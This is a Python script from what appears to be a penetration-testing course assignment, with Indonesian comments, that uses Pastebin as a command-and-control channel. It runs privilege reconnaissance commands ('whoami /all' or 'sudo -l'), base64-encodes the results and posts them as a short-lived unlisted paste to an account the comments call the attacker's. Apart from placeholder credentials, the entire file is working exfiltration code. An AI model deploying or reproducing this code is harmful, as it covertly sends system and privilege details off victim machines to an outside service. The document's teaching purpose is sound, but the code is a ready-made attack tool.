# Kristian Anwar - 2301853786
# Programming for Penetration Testing GSLC - Forum : PasteBin Sebagai C&C

import base64, sys
from subprocess import PIPE, Popen
from requests.api import post
from platform import system

def hostRecon():
    # mengumpulkan informasi mengenai Hostname, User yang login, dan Current Privileges
    if system() == "Windows":
        process = Popen("whoami /all", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
        result, err = process.communicate()
        
    elif system() == "Linux":
        process = Popen("sudo -l", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
        result, err = process.communicate()
    
    # jika terdapat error maka code akan langsung dihentikan
    if err != b'':
        print(err.decode())
        sys.exit(0)
    # jika proses shell diperoleh output, maka output akan disiapkan dan diencode kedalam base64
    elif result != b'':
        message = f"Host Reconnaissance Result :\n{result.decode()}"
        encoded_data = base64.b64encode(message.encode())
        return encoded_data

def pastebin_getuser_key(api_dev_key):
    pastebin_username = "[UNIQUE_PASTEBIN_USERNAME]"
    pastebin_password = "[UNIQUE_PASTEBIN_PASSWORD]"

    pastebin_login_url = "https://pastebin.com/api/api_login.php"

    login_data = {
        "api_dev_key": api_dev_key, # unique API Developers Key
        "api_user_name": pastebin_username,
        "api_user_password": pastebin_password
    }

    resp = post(pastebin_login_url, data=login_data)
    # jika proses login gagal
    if resp.status_code != 200:
        print("[!] Login FAILED")
        sys.exit(0)
    else:
        return resp.text
    

def pastebin_create_paste(encoded_data):
    api_dev_key = "[UNIQUE_API_DEVELOPERS_KEY]"
    api_user_key = pastebin_getuser_key(api_dev_key)

    create_paste_url = "https://pastebin.com/api/api_post.php"

    post_data = {
        "api_dev_key": api_dev_key, # unique API Developers Key
        "api_user_key": api_user_key, # unique API user Key yang digunakan untuk menambahkan paste ke akun attacker
        "api_option": "paste",  # set sebagai paste untuk membuat paste baru
        "api_paste_code": encoded_data, # text yang akan ditulis kedalam paste
        "api_paste_name" : "GLS_ProgPent_Pastebin", # judul paste
        "api_paste_expire_date" : "10M", # paste akan expired setelah 10 menit
        "api_paste_private": 1 # 0=public 1=unlisted 2=private
    } 
                  
    resp = post(create_paste_url, data=post_data)

    # jika create post gagal karena BAD API Response
    if resp.status_code != 200:
        print("[!] Create paste FAILED")
        print(f"[!] Error: {resp.text}")
    else:
        print("[*] Create paste SUCCEED")
        print(f"[*] Pastebin URL: {resp.text}")

def main():
    # melakukan Host Reconnaissance kemudian membuat paste pada pastebin
    host_encoded_data = hostRecon()
    pastebin_create_paste(host_encoded_data)

if __name__ == "__main__":
    main()